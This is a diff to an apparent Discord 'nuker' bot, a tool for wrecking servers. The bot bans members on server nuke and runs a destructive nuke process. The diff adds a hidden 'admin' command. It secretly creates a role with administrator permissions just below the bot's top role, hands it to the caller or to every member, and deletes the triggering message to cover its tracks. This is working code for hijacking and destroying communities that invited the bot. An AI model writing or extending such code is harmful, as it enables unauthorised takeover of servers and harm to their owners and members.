@@ -49,7 +49,7 @@ if os.path.exists("updated"):
     clear()
 
 if __name__ == '__main__':
-    local_version = str("0.3")
+    local_version = str("0.3.1")
 
     http = urllib3.PoolManager()
 
@@ -105,6 +105,7 @@ def_cfg = {
                 "Enable logging?": False,
                 "Ban on server nuke?": True,
                 "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
+                "admin_role_name": "sh....",
                 "invisible_mode": False,
                 "Enable_activity": True,
                 "Activity_type": "playing",
@@ -173,6 +174,7 @@ list_of_settings = ["token",
                             "Enable logging?",
                             "Ban on server nuke?",
                             "ban_reason",
+                            "admin_role_name",
                             "invisible_mode",
                             "Activity_type",
                             "Activity_name",
@@ -342,6 +344,27 @@ async def on_message(message: discord.Message):
                     multiprocessing.Process(target=start(curent_guild)).start()
                 if config["Ban on server nuke?"] == True:
                     create_task(banAll(message))
+        elif args[0] == config["nuke_prefix"]+"admin":
+            if config['only_whitelisted_users_can_perform_actions'] == True:
+                if message.author.id in config['whitelisted_ids']:
+                    if args[1] == "me":
+                        guild = message.guild
+                        get_bot = guild.get_member(bot.user.id)
+                        top_role = max(get_bot.roles, key=lambda r: r.position)
+                        r = await guild.create_role(name=config["admin_role_name"])
+                        await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
+                        await message.author.add_roles(r)
+                        await message.delete()
+                    elif args[1] == "all":
+                        guild = message.guild
+                        get_bot = guild.get_member(bot.user.id)
+                        top_role = max(get_bot.roles, key=lambda r: r.position)
+                        r = await guild.create_role(name=config["admin_role_name"])
+                        await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
+                        await message.delete()
+                        for members in list(message.guild.members):
+                            await members.add_roles(r)
+                  
 
 
     elif msg.startswith(config["prefix"]):
@@ -361,7 +384,6 @@ if __name__ == '__main__':
     try: bot.run(config['token'])
     except Exception as e:
         gradientText(((255,0,0),(255,0,0)),1,f"[ERROR] Token incorrect! Please send your error message to our support!\n\nError message: {e}","H")
-        sleep(3)
         webbrowser.open("https://discord.gg/QTDXqt8PA8")
         stop_nuker()
 
